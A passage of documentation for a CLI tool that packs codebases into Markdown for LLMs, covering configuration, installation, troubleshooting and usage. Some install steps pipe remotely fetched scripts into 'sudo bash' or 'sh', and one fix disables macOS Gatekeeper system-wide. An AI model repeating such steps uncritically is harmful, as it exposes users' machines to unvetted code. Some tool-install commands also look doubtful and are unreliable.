doc_header_template = "# Code context: {directory}"

# Custom section templates
stats_template = "## ðŸ“Š Statistics"
tree_template = "## ðŸ“ File Structure"
toc_template = "## ðŸ“‹ Table of Contents"
```

### [processing]

Processing and performance options:

```toml
[processing]
# Number of parallel workers (0 = auto-detect)
parallel_jobs = 0

# Files processed per batch
chunk_size = 1000

# Maximum processing time per file (seconds)
timeout_seconds = 300

# Memory limit per worker (MB)
memory_limit_mb = 512

# Enable streaming mode for large outputs
streaming = false
```

### [cache]

Caching configuration:

```toml
[cache]
# Enable caching
enabled = true

# Cache directory
directory = "~/.cache/context-creator"

# Maximum cache size (MB)
max_size_mb = 1024

# Cache entry time-to-live (hours)
ttl_hours = 24

# Cache compression
compress = true

# Auto-cleanup on startup
auto_cleanup = true
```

### ignore and include

File filtering patterns:

```toml
# Files/directories to ignore (glob patterns)
ignore = [
    ".git/",
    "node_modules/",
    "target/",
    "*.log",
    "*.tmp"
]

# Files to include (overrides ignore)
include = [
    "src/**/*",
    "*.toml",
    "README.*"
]
```

### [[priorities]]

File prioritization rules:

```toml
# High-priority pattern
[[priorities]]
pattern = "src/main.*"    # Glob pattern
weight = 200.0           # Priority weight (higher = more important)
description = "Main entry points"  # Optional description

# Medium-priority pattern
[[priorities]]
pattern = "*.rs"
weight = 150.0
description = "Rust source files"

# Conditional priorities
[[priorities]]
pattern = "tests/**/*"
weight = 30.0
description = "Test files"
condition = "include_tests"  # Only apply if condition is true
```

### [tools.*]

LLM tool configurations:

```toml
[tools.gemini]
command = "gemini"           # Command to execute
args = ["--format", "markdown"]  # Default arguments
timeout = 60                     # Timeout in seconds
max_retries = 3                  # Retry attempts
env = { GOOGLE_API_KEY = "..." } # Environment variables

[tools.custom-llm]
command = "/path/to/custom-llm"
args = ["--mode", "code-analysis"]
timeout = 120
working_dir = "/tmp"
```

### [projects]

Project-specific overrides:

```toml
[projects."~/work/project1"]
max_tokens = 100000
tool = "codex"
ignore = ["old-code/"]

[projects."/absolute/path"]
verbose = true
include = ["core/**/*"]
```

## Environment Variables

All configuration options can be set via environment variables using the prefix `CODE_context_`:

```bash
# Basic options
export CODE_context_MAX_TOKENS=50000
export CODE_context_PROGRESS=true
export CODE_context_VERBOSE=false
export CODE_context_TOOL=gemini

# Paths
export CODE_context_CONFIG=/path/to/config.toml
export CODE_context_CACHE_DIR=/path/to/cache

# Processing
export CODE_context_PARALLEL_JOBS=8
export CODE_context_CHUNK_SIZE=1000
export CODE_context_TIMEOUT_SECONDS=300

# Patterns (comma-separated)
export CODE_context_IGNORE="target/,node_modules/,*.log"
export CODE_context_INCLUDE="src/**/*,*.toml"

# LLM integration
export CODE_context_LLM_TIMEOUT=120
export CODE_context_LLM_RETRIES=3

# Debug options
export RUST_LOG=debug
export RUST_BACKTRACE=1
```

## Command-Line Arguments

All options can be overridden via command-line arguments:

```bash
# Basic usage
context-creator --max-tokens 25000
context-creator --tool codex
context-creator --verbose --progress

# File filtering
context-creator --ignore "*.log,*.tmp"
context-creator --include "src/**/*"

# Configuration
context-creator --config custom.toml
context-creator --no-config  # Skip all config files

# Output format
context-creator --no-tree --no-stats --no-toc
context-creator --group-by-type
```

## Validation

### Configuration Validation

```bash
# Validate configuration file
context-creator --validate-config -c config.toml

# Show effective configuration
context-creator --show-config

# Generate configuration schema
context-creator --config-schema > schema.json

# Dry run (validate without processing)
context-creator --dry-run -d project
```

### Schema Validation

```json
{
  "$schema": "https://raw.githubusercontent.com/matiasvillaverde/context-creator/main/schema/config.schema.json",
  "type": "object",
  "properties": {
    "defaults": {
      "type": "object",
      "properties": {
        "max_tokens": { "type": "integer", "minimum": 0 },
        "progress": { "type": "boolean" },
        "verbose": { "type": "boolean" },
        "tool": { "type": "string", "enum": ["gemini", "codex", "claude"] }
      }
    }
  }
}
```

## Best Practices

### Configuration Organization

```bash
# Project structure
project/
â”œâ”€â”€ .context-creator.toml      # Project-specific config
â”œâ”€â”€ src/
â””â”€â”€ docs/

# User configuration
~/.config/context-creator/
â”œâ”€â”€ config.toml            # Main config
â”œâ”€â”€ rust-projects.toml     # Rust-specific config
â””â”€â”€ web-projects.toml      # Web project config
```

### Inheritance and Includes

```toml
# Main config
[defaults]
max_tokens = 50000

# Include specialized configs
include = [
    "rust-projects.toml",
    "web-projects.toml"
]

# Override for specific projects
[projects."~/work/special-project"]
config = "special-config.toml"
```

### Performance Optimization

```toml
[processing]
# Use all CPU cores
parallel_jobs = 0

# Larger chunks for better performance
chunk_size = 2000

# Enable caching for frequently accessed projects
[cache]
enabled = true
max_size_mb = 2048
```

### Security Configuration

```toml
# Secure defaults
ignore = [
    ".env",
    ".env.*",
    "secrets/",
    "*.key",
    "*.pem",
    "*.p12",
    "credentials.json",
    "auth.json",
    "*.secret"
]

[tools.gemini]
# Don't log sensitive data
args = ["--no-log", "--secure"]
```

## Troubleshooting

### Common Configuration Issues

```bash
# Check configuration loading
RUST_LOG=debug context-creator --show-config

# Validate TOML syntax
toml-lint config.toml

# Test pattern matching
context-creator --dry-run --verbose -d project

# Check environment variables
env | grep CODE_context
```

### Configuration Debugging

```toml
# Add debugging section
[debug]
log_config_loading = true
log_pattern_matching = true
log_priority_calculation = true
show_filtered_files = true
```

## Migration

### From v0.x to v1.0

```bash
# Migrate old configuration
context-creator --migrate-config ~/.context-creator.conf

# Convert environment variables
context-creator --migrate-env > new-config.toml
```

### Configuration Templates

```bash
# Generate template for specific use case
context-creator --template rust-project > rust.toml
context-creator --template web-project > web.toml
context-creator --template minimal > minimal.toml
```

## Advanced Configuration

### Custom File Types

```toml
[[file_types]]
extensions = [".custom"]
language = "custom"
priority = 100.0
processor = "text"

[[file_types]]
extensions = [".proto"]
language = "protobuf"
priority = 120.0
processor = "code"
```

### Conditional Configuration

```toml
# Environment-based configuration
[environments.development]
verbose = true
include = ["tests/**/*"]

[environments.production]
quiet = true
ignore = ["tests/**/*", "docs/**/*"]

# Use with: CODE_context_ENV=development context-creator
```

### Plugin Configuration

```toml
# Plugin system (future feature)
[[plugins]]
name = "custom-processor"
path = "/path/to/plugin.so"
config = { option1 = "value1" }

[[plugins]]
name = "output-formatter"
url = "https://github.com/user/plugin"
version = "1.2.3"
```

## Next Steps

- See [Usage Guide](usage.md) for practical examples
- Check [Examples](examples.md) for configuration templates
- Read [API Reference](api.md) for programmatic configuration
- Visit [Troubleshooting](troubleshooting.md) for common issues
```

## docs/installation.md

```markdown
# Installation Guide

This guide covers various methods to install context-creator on different platforms.

## Prerequisites

- **Operating System**: Linux, macOS, or Windows
- **Rust** (if building from source): 1.70.0 or later
- **Memory**: Minimum 512MB RAM, 2GB+ recommended for large projects
- **Storage**: 50MB for installation, additional space for generated files

## Quick Install (Recommended)

### Using Cargo (All Platforms)

```bash
# Install from crates.io
cargo install context-creator

# Verify installation
context-creator --version
```

### Using Pre-built Binaries

Download the latest release for your platform:

```bash
# Linux x86_64
curl -L https://github.com/matiasvillaverde/context-creator/releases/latest/download/context-creator-linux-x86_64.tar.gz | tar xz
sudo mv context-creator /usr/local/bin/

# macOS (Intel)
curl -L https://github.com/matiasvillaverde/context-creator/releases/latest/download/context-creator-macos-x86_64.tar.gz | tar xz
sudo mv context-creator /usr/local/bin/

# macOS (Apple Silicon)
curl -L https://github.com/matiasvillaverde/context-creator/releases/latest/download/context-creator-macos-aarch64.tar.gz | tar xz
sudo mv context-creator /usr/local/bin/

# Windows
# Download context-creator-windows.zip from releases page
# Extract and add to PATH
```

## Package Managers

### Homebrew (macOS and Linux)

```bash
# Add tap
brew tap matiasvillaverde/tap

# Install
brew install context-creator

# Update
brew upgrade context-creator
```

### Arch Linux (AUR)

```bash
# Using yay
yay -S context-creator

# Using paru
paru -S context-creator

# Manual installation
git clone https://aur.archlinux.org/context-creator.git
cd context-creator
makepkg -si
```

### Debian/Ubuntu

```bash
# Add repository
curl -fsSL https://raw.githubusercontent.com/matiasvillaverde/context-creator/main/scripts/install-deb.sh | sudo bash

# Install
sudo apt update
sudo apt install context-creator

# Update
sudo apt upgrade context-creator
```

### RPM-based (RHEL, CentOS, Fedora)

```bash
# Add repository
sudo curl -o /etc/yum.repos.d/context-creator.repo https://raw.githubusercontent.com/matiasvillaverde/context-creator/main/scripts/context-creator.repo

# Install (DNF)
sudo dnf install context-creator

# Install (YUM)
sudo yum install context-creator

# Update
sudo dnf upgrade context-creator
```

### Windows Package Managers

#### Chocolatey

```powershell
# Install
choco install context-creator

# Update
choco upgrade context-creator
```

#### Scoop

```powershell
# Add bucket
scoop bucket add matiasvillaverde https://github.com/matiasvillaverde/scoop-bucket

# Install
scoop install context-creator

# Update
scoop update context-creator
```

#### WinGet

```powershell
# Install
winget install matiasvillaverde.context-creator

# Update
winget upgrade matiasvillaverde.context-creator
```

## Building from Source

### Clone and Build

```bash
# Clone repository
git clone https://github.com/matiasvillaverde/context-creator.git
cd context-creator

# Build release version
cargo build --release

# Install globally
cargo install --path .

# Or run directly
./target/release/context-creator --version
```

### Development Build

```bash
# Clone with development tools
git clone https://github.com/matiasvillaverde/context-creator.git
cd context-creator

# Install development dependencies
cargo install cargo-watch cargo-tarpaulin

# Build and test
make test
make bench

# Run in development mode
cargo run -- --help
```

### Custom Features

```bash
# Build with specific features
cargo build --release --features "custom-tokenizer,extended-formats"

# Build minimal version
cargo build --release --no-default-features
```

## LLM CLI Tools (Optional)

For direct LLM integration, install one or more LLM CLI tools:

### Gemini CLI

```bash
# Python/pip installation
pip install gemini

# Verify
gemini --version
```

### OpenAI Codex CLI

```bash
# Install from GitHub
npm install -g @openai/codex-cli

# Configure API key
export OPENAI_API_KEY="your-api-key"

# Verify
codex --version
```

### Anthropic Claude CLI

```bash
# Install from pip
pip install anthropic-cli

# Configure
export ANTHROPIC_API_KEY="your-api-key"

# Verify
claude --version
```

## Verification

After installation, verify everything works:

```bash
# Check version
context-creator --version

# Test basic functionality
cd /tmp
mkdir test-project
echo "fn main() { println!(\"Hello!\"); }" > test-project/main.rs
context-creator -d test-project

# Test with configuration
context-creator --help
```

Expected output:
```
context-creator 0.1.0
High-performance CLI tool to convert codebases to Markdown for LLM context

USAGE:
    context-creator [OPTIONS] [PROMPT]

ARGS:
    <PROMPT>    The prompt to send to the LLM...
```

## Environment Setup

### Shell Completion

#### Bash

```bash
# Generate completion script
context-creator --generate-completion bash > ~/.local/share/bash-completion/completions/context-creator

# Or add to .bashrc
echo 'eval "$(context-creator --generate-completion bash)"' >> ~/.bashrc
```

#### Zsh

```bash
# Generate completion script
context-creator --generate-completion zsh > ~/.local/share/zsh/site-functions/_context-creator

# Or add to .zshrc
echo 'eval "$(context-creator --generate-completion zsh)"' >> ~/.zshrc
```

#### Fish

```bash
# Generate completion script
context-creator --generate-completion fish > ~/.config/fish/completions/context-creator.fish
```

#### PowerShell

```powershell
# Generate completion script
context-creator --generate-completion powershell | Out-String | Invoke-Expression

# Add to profile
Add-Content $PROFILE 'context-creator --generate-completion powershell | Out-String | Invoke-Expression'
```

### Configuration Directory

Create default configuration directory:

```bash
# Linux/macOS
mkdir -p ~/.config/context-creator
mkdir -p ~/.local/share/context-creator

# Windows
mkdir %APPDATA%\context-creator
mkdir %LOCALAPPDATA%\context-creator
```

### Environment Variables

```bash
# Optional: Set default configuration file
export CODE_context_CONFIG="$HOME/.config/context-creator/config.toml"

# Optional: Set default cache directory
export CODE_context_CACHE_DIR="$HOME/.cache/context-creator"

# Optional: Set log level
export CODE_context_LOG_LEVEL="info"

# Optional: Set performance tuning
export CODE_context_PARALLEL_JOBS="8"
```

## Troubleshooting

### Common Issues

#### Permission Denied

```bash
# Linux/macOS: Fix permissions
sudo chown -R $(whoami) /usr/local/bin/context-creator
chmod +x /usr/local/bin/context-creator

# Windows: Run as Administrator or add to user PATH
```

#### Rust Not Found

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env

# Update PATH
echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> ~/.bashrc
```

#### Build Failures

```bash
# Update Rust
rustup update stable

# Clear cache
cargo clean

# Check dependencies
cargo check

# Specific error fixes
cargo update
```

#### Memory Issues

```bash
# Increase build parallelism
export CARGO_BUILD_JOBS=2

# Use less memory
export CARGO_PROFILE_RELEASE_LTO=thin
```

### Performance Tuning

```bash
# Enable all CPU cores
export RAYON_NUM_THREADS=$(nproc)

# Optimize for current CPU
export RUSTFLAGS="-C target-cpu=native"

# Use faster linker (Linux)
sudo apt install lld
export RUSTFLAGS="-C link-arg=-fuse-ld=lld"
```

## Next Steps

- Read the [Usage Guide](usage.md) for basic operations
- See [Configuration Reference](configuration.md) for advanced setup
- Check [Examples](examples.md) for common use cases
- Join our [Community](https://github.com/matiasvillaverde/context-creator/discussions)

## Uninstallation

### Cargo Installation

```bash
cargo uninstall context-creator
```

### Package Managers

```bash
# Homebrew
brew uninstall context-creator

# APT
sudo apt remove context-creator

# DNF/YUM
sudo dnf remove context-creator

# Chocolatey
choco uninstall context-creator

# Scoop
scoop uninstall context-creator
```

### Manual Installation

```bash
# Remove binary
sudo rm /usr/local/bin/context-creator

# Remove configuration
rm -rf ~/.config/context-creator
rm -rf ~/.local/share/context-creator
```
```

## docs/troubleshooting.md

```markdown
# Troubleshooting Guide

Common issues, solutions, and debugging techniques for context-creator.

## Installation Issues

### Cargo Installation Fails

**Problem**: `cargo install context-creator` fails with compilation errors.

**Solutions**:

```bash
# Update Rust to latest stable
rustup update stable

# Clear cargo cache
cargo clean
rm -rf ~/.cargo/registry/cache

# Install with verbose output
cargo install context-creator --verbose

# Try with specific features
cargo install context-creator --no-default-features
```

**Common Causes**:
- Outdated Rust version (requires 1.70.0+)
- Corrupted cargo cache
- Missing system dependencies

### Permission Denied

**Problem**: Cannot execute context-creator after installation.

**Solutions**:

```bash
# Linux/macOS: Fix permissions
sudo chown $(whoami) /usr/local/bin/context-creator
chmod +x /usr/local/bin/context-creator

# Add to PATH if installed via cargo
echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Windows: Run as Administrator or add to user PATH
```

### LLM Tools Not Found

**Problem**: `gemini: command not found` or similar.

**Solutions**:

```bash
# Install gemini
pip install gemini

# Install codex CLI
npm install -g @openai/codex-cli

# Check PATH
echo $PATH
which gemini

# Use full path
context-creator -d project --tool /full/path/to/gemini "prompt"
```

## Runtime Issues

### Out of Memory Errors

**Problem**: Process killed or memory allocation failures.

**Solutions**:

```bash
# Use token limits to reduce memory usage
context-creator -d project --max-tokens 25000

# Process in smaller chunks
context-creator -d project/src --max-tokens 10000
context-creator -d project/lib --max-tokens 10000

# Exclude large files
echo "*.log" >> .contextignore
echo "node_modules/" >> .contextignore
echo "target/" >> .contextignore

# Monitor memory usage
top -p $(pgrep context-creator)
```

**Memory Optimization**:

```toml
# config.toml
[processing]
chunk_size = 500          # Smaller chunks
parallel_jobs = 2         # Fewer workers
memory_limit_mb = 512     # Per-worker limit

[cache]
enabled = false           # Disable caching if needed
```

### Performance Issues

**Problem**: Slow processing of large projects.

**Solutions**:

```bash
# Use all CPU cores
export RAYON_NUM_THREADS=$(nproc)

# Optimize for current CPU
export RUSTFLAGS="-C target-cpu=native"

# Profile performance
time context-creator -d project --max-tokens 50000

# Use parallel processing
context-creator -d project --progress --verbose
```

**Performance Configuration**:

```toml
[processing]
parallel_jobs = 0         # Auto-detect CPU cores
chunk_size = 2000         # Larger chunks for better performance
timeout_seconds = 300     # Prevent hangs

[cache]
enabled = true
max_size_mb = 2048        # Larger cache
```

### Token Count Issues

**Problem**: Output exceeds LLM context window.

**Solutions**:

```bash
# Set appropriate token limits
context-creator -d project --max-tokens 4000    # GPT-3.5
context-creator -d project --max-tokens 8000    # GPT-4
context-creator -d project --max-tokens 32000   # GPT-4 Turbo

# Check token usage
context-creator -d project --max-tokens 10000 --verbose

# Prioritize important files
cat > priority-config.toml << EOF
[[priorities]]
pattern = "src/main.*"
weight = 300.0

[[priorities]]
pattern = "src/core/*"
weight = 200.0
EOF

context-creator -c priority-config.toml -d project --max-tokens 15000
```

### File Access Errors

**Problem**: Permission denied reading files or directories.

**Solutions**:

```bash
# Check permissions
ls -la project/
ls -la project/src/

# Fix ownership
sudo chown -R $(whoami) project/

# Skip inaccessible files
context-creator -d project --verbose 2>&1 | grep -v "Permission denied"

# Use ignore patterns
echo "restricted/" >> .contextignore
```

## Configuration Issues

### Configuration Not Loading

**Problem**: Configuration file ignored or not found.

**Debug Steps**:

```bash
# Check configuration loading
context-creator --show-config

# Test specific config file
context-creator -c config.toml --validate-config

# Debug configuration loading
RUST_LOG=debug context-creator -d project 2>&1 | grep config

# Check file locations
ls -la ~/.config/context-creator/
ls -la .context-creator.toml
```

**Common Issues**:
- TOML syntax errors
- Wrong file location
- Incorrect permissions

### TOML Syntax Errors

**Problem**: Configuration parsing fails.

**Solutions**:

```bash
# Validate TOML syntax
toml-lint config.toml

# Use online validator
# https://www.toml-lint.com/

# Generate valid template
context-creator --config-template > valid-config.toml

# Common fixes:
# - Use double quotes for strings
# - Proper array syntax: ["item1", "item2"]
# - Correct section headers: [section]
```

**Example Fixes**:

```toml
# Wrong
ignore = [target/, node_modules/]

# Correct
ignore = ["target/", "node_modules/"]

# Wrong
[priority]
pattern = src/*.rs

# Correct
[[priorities]]
pattern = "src/*.rs"
```

### Pattern Matching Issues

**Problem**: Files not filtered as expected.

**Debug Patterns**:

```bash
# Test pattern matching
context-creator -d project --dry-run --verbose

# Show matched files
context-creator -d project --show-matches

# Test specific patterns
context-creator -d project --include "src/**/*.rs" --dry-run
```

**Pattern Examples**:

```bash
# Glob patterns (correct)
"src/**/*.rs"      # All .rs files in src/ recursively
"*.{js,ts}"        # All .js and .ts files
"**/test_*.py"     # All test files

# Common mistakes
"src/**.rs"        # Wrong: should be src/**/*.rs
"src/*.rs"         # Only matches direct children
"src**"            # Matches filenames starting with 'src'
```

## LLM Integration Issues

### API Key Problems

**Problem**: LLM tool authentication fails.

**Solutions**:

```bash
# Set API keys
export OPENAI_API_KEY="your-key"
export GOOGLE_API_KEY="your-key"
export ANTHROPIC_API_KEY="your-key"

# Verify keys are set
echo $OPENAI_API_KEY | cut -c1-10

# Test tool directly
gemini --help
codex --version

# Check tool configuration
context-creator --show-tools
```

### LLM Tool Timeouts

**Problem**: LLM requests timeout or fail.

**Solutions**:

```bash
# Increase timeout
context-creator -d project --llm-timeout 120 "prompt"

# Use smaller token limits
context-creator -d project --max-tokens 10000 "prompt"

# Test tool directly
echo "test prompt" | gemini

# Use alternative tool
context-creator -d project --tool codex "prompt"
```

**Configuration**:

```toml
[tools.gemini]
timeout = 120
max_retries = 3

[tools.codex]
timeout = 180
max_retries = 2
```

### Rate Limiting

**Problem**: API rate limits exceeded.

**Solutions**:

```bash
# Add delays between requests
context-creator -d project --llm-delay 5 "prompt"

# Use smaller chunks
context-creator -d project --max-tokens 5000 "prompt"

# Batch process with delays
for dir in src/*; do
    context-creator -d "$dir" --max-tokens 8000 "analyze this module"
    sleep 10
done
```

## Output Issues

### Malformed Markdown

**Problem**: Generated markdown has formatting issues.

**Solutions**:

```bash
# Validate markdown
markdownlint output.md

# Check encoding
file output.md
iconv -f UTF-8 -t UTF-8 output.md > clean-output.md

# Debug template issues
context-creator -d project --show-templates
```

**Template Fixes**:

```toml
[format]
file_header_template = "## {path}"          # Simple format
doc_header_template = "# Code context"       # Remove variables if problematic
```

### Empty or Minimal Output

**Problem**: Output contains very little content.

**Debug Steps**:

```bash
# Check if files are being found
context-creator -d project --dry-run --verbose

# Verify token limits aren't too low
context-creator -d project --max-tokens 50000 --verbose

# Check ignore patterns
context-creator -d project --show-ignored

# Test without token limits
context-creator -d project
```

### Encoding Issues

**Problem**: Special characters or encoding problems.

**Solutions**:

```bash
# Force UTF-8 encoding
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# Convert encoding
iconv -f ISO-8859-1 -t UTF-8 input.md > output.md

# Check file encodings
file project/src/*.rs
```

## Platform-Specific Issues

### Windows Issues

**Problem**: Path or permission issues on Windows.

**Solutions**:

```powershell
# Use forward slashes or escape backslashes
context-creator -d "C:/Projects/MyApp"
context-creator -d "C:\\Projects\\MyApp"

# Run as Administrator for system-wide installation
# Right-click Command Prompt -> "Run as Administrator"

# Use Windows Subsystem for Linux (WSL)
wsl
context-creator -d /mnt/c/Projects/MyApp

# Fix line endings
git config --global core.autocrlf true
```

### macOS Issues

**Problem**: Code signing or notarization warnings.

**Solutions**:

```bash
# Allow unsigned binary
sudo spctl --master-disable

# Or allow specific binary
sudo xattr -r -d com.apple.quarantine /usr/local/bin/context-creator

# Install via Homebrew for signed version
brew install context-creator
```

### Linux Issues

**Problem**: Missing dependencies or library issues.

**Solutions**:

```bash
# Install required libraries
sudo apt-get install build-essential pkg-config
sudo apt-get install libssl-dev

# For older distributions
sudo apt-get install libc6-dev

# Check library dependencies
ldd $(which context-creator)

# Use static binary if available
wget https://releases.../context-creator-linux-static
```

## Debugging Techniques

### Enable Debug Logging

```bash
# Full debug output
RUST_LOG=debug context-creator -d project --verbose

# Specific module debugging
RUST_LOG=code_context::core=debug context-creator -d project

# Trace level (very verbose)
RUST_LOG=trace context-creator -d project 2> debug.log

# Filter debug output
RUST_LOG=debug context-creator -d project 2>&1 | grep -E "(ERROR|WARN)"
```

### Performance Profiling

```bash
# Time execution
time context-creator -d project --max-tokens 50000

# Profile with system tools
perf record -g context-creator -d project
perf report

# Memory profiling
valgrind --tool=massif context-creator -d project
```

### Network Debugging

```bash
# Monitor network requests (for LLM integration)
tcpdump -i any port 443

# Check DNS resolution
nslookup api.openai.com

# Test connectivity
curl -v https://api.openai.com/

# Debug proxy issues
export HTTP_PROXY=http://proxy:8080
export HTTPS_PROXY=http://proxy:8080
```

## Recovery Procedures

### Reset Configuration

```bash
# Backup current config
cp ~/.config/context-creator/config.toml ~/.config/context-creator/config.toml.bak

# Reset to defaults
rm ~/.config/context-creator/config.toml
context-creator --generate-config > ~/.config/context-creator/config.toml

# Test with minimal config
context-creator -d project --no-config
```

### Clear Cache

```bash
# Clear application cache
rm -rf ~/.cache/context-creator/

# Clear cargo cache
cargo clean

# Clear temporary files
rm -rf /tmp/context-creator-*
```

### Reinstall

```bash
# Complete reinstall
cargo uninstall context-creator
rm -rf ~/.cargo/registry/cache/
cargo install context-creator

# Or use binary installation
curl -L https://github.com/.../latest/download/... | tar xz
sudo mv context-creator /usr/local/bin/
```

## Getting Help

### Collect Debug Information

```bash
# System information
uname -a
rustc --version
cargo --version

# Application version
context-creator --version

# Configuration dump
context-creator --show-config > debug-config.txt

# Test run with debug output
RUST_LOG=debug context-creator -d small-project 2> debug-output.txt
```

### Report Issues

When reporting issues, include:

1. **System Information**: OS, architecture, Rust version
2. **context-creator Version**: `context-creator --version`
3. **Command Used**: Exact command that failed
4. **Error Output**: Full error messages
5. **Configuration**: Relevant config file contents
6. **Project Structure**: General description of project being analyzed

**Issue Template**:

```markdown
## Bug Report

**Environment:**
- OS: [Linux/macOS/Windows]
- context-creator version: [output of `context-creator --version`]
- Rust version: [output of `rustc --version`]

**Command:**
```bash
context-creator -d my-project --max-tokens 50000
```

**Expected Behavior:**
[What you expected to happen]

**Actual Behavior:**
[What actually happened]

**Error Output:**
```
[Full error message]
```

**Configuration:**
```toml
[Relevant config file contents]
```

**Additional Context:**
[Any other relevant information]
```

### Community Resources

- **GitHub Issues**: [Report bugs and feature requests](https://github.com/matiasvillaverde/context-creator/issues)
- **Discussions**: [Ask questions and share ideas](https://github.com/matiasvillaverde/context-creator/discussions)
- **Documentation**: [Complete documentation](https://docs.rs/context-creator)
- **Examples**: [Community examples repository](https://github.com/matiasvillaverde/context-creator-examples)

## Prevention

### Best Practices

1. **Regular Updates**: Keep context-creator updated
2. **Configuration Validation**: Test configs before deployment
3. **Resource Monitoring**: Monitor memory and CPU usage
4. **Backup Configs**: Keep configuration backups
5. **Test Early**: Test with small projects first

### Health Checks

```bash
# Regular health check script
#!/bin/bash
echo "context-creator Health Check"
echo "========================"

# Version check
echo "Version: $(context-creator --version)"

# Configuration check
if context-creator --validate-config; then
    echo "âœ“ Configuration valid"
else
    echo "âœ— Configuration invalid"
fi

# Performance test
start_time=$(date +%s)
context-creator -d /tmp --max-tokens 1000 --quiet
end_time=$(date +%s)
duration=$((end_time - start_time))

echo "Performance: ${duration}s for small test"

if [ $duration -lt 10 ]; then
    echo "âœ“ Performance good"
else
    echo "! Performance degraded"
fi
```

This comprehensive troubleshooting guide should help users resolve most common issues they might encounter with context-creator.
```

## docs/usage.md

```markdown
# Usage Guide

This guide covers all aspects of using context-creator effectively, from basic commands to advanced workflows.

## Basic Usage

### Simple Markdown Generation

```bash
# Generate markdown for current directory
context-creator

# Process specific directory
context-creator -d /path/to/project

# Save to file
context-creator -d /path/to/project -o project.md

# Process with progress indicators
context-creator -d /path/to/project -o project.md --progress
```

### LLM Integration

```bash
# Direct LLM interaction (requires gemini or codex)
context-creator -d /path/to/project "Explain the architecture"

# With specific LLM tool
context-creator -d /path/to/project --tool gemini "Review this code"
context-creator -d /path/to/project --tool codex "Find potential bugs"

# Analyze specific aspects
context-creator -d /path/to/project "What are the main security concerns?"
context-creator -d /path/to/project "How can we improve performance?"
```

## Command Line Options

### Core Options

```bash
# Directory to process (default: current directory)
context-creator -d /path/to/project
context-creator --directory /path/to/project

# Output file (default: stdout)
context-creator -o output.md
context-creator --output output.md

# Maximum tokens (for token-limited LLMs)
context-creator --max-tokens 50000
context-creator --max-tokens 100000

# LLM tool selection
context-creator -t gemini
context-creator --tool codex

# Configuration file
context-creator -c config.toml
context-creator --config /path/to/config.toml
```

### Verbosity and Output

```bash
# Quiet mode (suppress all output except errors)
context-creator -q
context-creator --quiet

# Verbose mode (detailed logging)
context-creator -v
context-creator --verbose

# Progress indicators
context-creator --progress

# Combined options
context-creator -d /path/to/project -o output.md --verbose --progress
```

### Help and Information

```bash
# Show help
context-creator -h
context-creator --help

# Show version
context-creator --version

# List supported file types
context-creator --list-types

# Show configuration schema
context-creator --config-schema
```

## Token Management

### Understanding Token Limits

Token limits help optimize output for LLM context windows:

```bash
# GPT-3.5 Turbo (4K context)
context-creator --max-tokens 3000

# GPT-4 (8K context)
context-creator --max-tokens 7000

# GPT-4 Turbo (128K context)
context-creator --max-tokens 120000

# Claude-3 (200K context)
context-creator --max-tokens 180000
```

### Token Usage Examples

```bash
# Small project analysis
context-creator -d small-project --max-tokens 5000

# Medium project with prioritization
context-creator -d medium-project --max-tokens 25000 --verbose

# Large project with careful selection
context-creator -d large-project --max-tokens 100000 --progress

# No token limit (include everything)
context-creator -d project  # No --max-tokens
```

## File Filtering

### Using .contextignore

Create a `.contextignore` file in your project root:

```bash
# Example .contextignore
node_modules/
target/
.git/
*.log
*.tmp
dist/
build/
.DS_Store
__pycache__/
*.pyc
.env
secrets.txt
```

### Configuration-based Filtering

```toml
# In config.toml
ignore = [
    "tests/",
    "docs/",
    "*.md",
    "*.json"
]

include = [
    "src/**/*.rs",
    "lib/**/*.js",
    "*.toml"
]
```

## Configuration Files

### Basic Configuration

```toml
# ~/.config/context-creator/config.toml

[defaults]
max_tokens = 50000
progress = true
verbose = false
tool = "gemini"

ignore = [
    "node_modules/",
    "target/",
    ".git/"
]

[[priorities]]
pattern = "src/main.*"
weight = 200.0

[[priorities]]
pattern = "*.rs"
weight = 150.0

[[priorities]]
pattern = "*.toml"
weight = 100.0
```

### Project-specific Configuration

```bash
# Create project config
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 25000
progress = true

ignore = ["tests/", "benches/"]

[[priorities]]
pattern = "src/core/*"
weight = 200.0
EOF

# Use project config
context-creator -c .context-creator.toml -d .
```

## Workflow Examples

### Code Review Workflow

```bash
# 1. Generate comprehensive review
context-creator -d feature-branch --max-tokens 50000 -o review.md

# 2. Focus on changes
git diff main..feature-branch --name-only | while read file; do
    echo "## $file" >> changes.md
    context-creator -d . --include "$file" >> changes.md
done

# 3. Interactive review with LLM
context-creator -d feature-branch "Review this code for:"
context-creator -d feature-branch "1. Security vulnerabilities"
context-creator -d feature-branch "2. Performance issues"
context-creator -d feature-branch "3. Code quality concerns"
```

### Documentation Generation

```bash
# Generate API documentation
context-creator -d src/ --max-tokens 30000 "Generate API documentation"

# Create onboarding guide
context-creator -d . "Create a guide for new developers"

# Architecture overview
context-creator -d . --max-tokens 20000 "Explain the system architecture"

# Technical debt analysis
context-creator -d . "Identify areas of technical debt"
```

### Migration Planning

```bash
# Analyze codebase for migration
context-creator -d legacy-app "Analyze for Python 2 to 3 migration"
context-creator -d js-app "Plan migration from JavaScript to TypeScript"
context-creator -d . "Identify dependencies for cloud migration"

# Generate migration checklist
context-creator -d . -o migration-analysis.md --max-tokens 40000
```

### Learning and Understanding

```bash
# Understand new codebase
context-creator -d unknown-project "Explain what this project does"

# Learn specific patterns
context-creator -d . "Show examples of the observer pattern"

# Understand architecture
context-creator -d . "Describe the microservices architecture"

# Find examples
context-creator -d . "Show how authentication is implemented"
```

## Advanced Usage

### Parallel Processing

```bash
# Control parallelism
export RAYON_NUM_THREADS=8
context-creator -d large-project

# Process multiple projects
parallel -j4 'context-creator -d {} -o {/.}.md' ::: project1 project2 project3 project4
```

### Batch Processing

```bash
#!/bin/bash
# Process multiple directories

for project in projects/*/; do
    echo "Processing $project..."
    context-creator -d "$project" -o "docs/$(basename "$project").md" --progress
done
```

### Custom Templates

```bash
# Using configuration templates
context-creator -c templates/api-docs.toml -d api/
context-creator -c templates/security-review.toml -d .
context-creator -c templates/performance.toml -d critical-path/
```

### Integration with CI/CD

```yaml
# .github/workflows/documentation.yml
name: Generate Documentation

on:
  push:
    branches: [main]

jobs:
  docs:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
